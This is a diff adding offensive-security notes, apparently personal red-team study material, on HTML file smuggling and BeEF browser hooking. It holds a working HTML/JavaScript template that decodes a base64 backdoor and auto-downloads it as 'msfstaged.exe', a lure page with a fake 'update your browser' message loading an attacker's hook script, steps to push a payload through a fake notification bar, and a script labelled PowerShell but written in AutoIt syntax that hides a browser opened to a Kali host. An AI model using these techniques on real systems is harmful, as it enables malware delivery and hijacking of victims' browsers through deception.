@@ -172,3 +172,83 @@ ActiveX controls and subroutine names to use for automatic marco execution
 ![ActiveX](./Assets/image_4.png)
 
 We usually use `Microsoft InkEdit Control`
+
+# File smuggling with hmtl
+
+Delivery is the pharse in which the attacket deliver the payload to the target
+- Embedding malicous content within a HTML and JS element, encode and obfuscate
+- Deliver through email or web
+- Reconstruction and execute.
+
+Example code ~ replace `file` with encoded payload
+
+```html
+<html>
+  
+  <body>
+    <script>
+      function base64ToArrayBuffer(base64) {
+        let binary_string = window.atob(base64);
+        var len = binary_string.length;
+        var bytes = new Uint8Array(len);
+        for (var i = 0; i < len; i++) {
+          bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes.buffer;
+      }
+      var file = '<backdoor.exe Base64 Encoded Value>'
+      var data = base64ToArrayBuffer(file);
+      var blob = new Blob([data], {
+        type: 'octet/stream'
+      });
+      var fileName = 'msfstaged.exe';
+      var a = document.createElement('a');
+      document.body.appendChild(a);
+      a.style = 'display: none';
+      var url = window.URL.createObjectURL(blob);
+      a.href = url;
+      a.download = fileName;
+      a.click();
+      window.URL.revokeObjectURL(url);
+    </script>
+  </body>
+
+</html>
+```
+
+## Establish shell through victim browser
+
+- Start `BeEF` -> go to their login page `beef/password`
+- Goto `/var/www/html` and delete `index.hmtl` -> replace with custom html
+    - copy the Hook URL
+    - creating the "index.html" file within the `/var/www/html`
+    - `service apache2 start` Start web server
+- Hook the browser of victim to our BeEF -> Create payload, set up multi handler and use social engineering feature in BeEF to lure victim to execute the payload.
+    - We can create simple script to simulate user interaction
+    - After interact, the hook should be create between victim browser and BeEF
+- Set up payload and multi/handler
+    - Utilize the "Fake Notification Bar (Firefox)" module to prompt the victim's browser with a notification to download the payload.
+    - Execute the payload on the victim machine
+
+Simple html page for BeEf
+
+```html
+<html>
+        <head>
+                <script src="<Hook URL>"></script>
+        </head>
+        <body>
+                <h1>Please update your browser to access the website.</h1>
+        </body>
+</html>
+```
+
+Simple script to simulate user interaction with website
+
+```powershell
+$path = "C:\Program Files (x86)\Firefox Developer Edition\"
+$path1 = "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\"
+ShellExecute($path & "firefox.exe", "http://<KALI-IP>", "", "", @SW_HIDE)
+WinWait("[TITLE:Firefox Developer Edition]")
+WinSetState ("[LAST]", "", @SW_HIDE)
+```
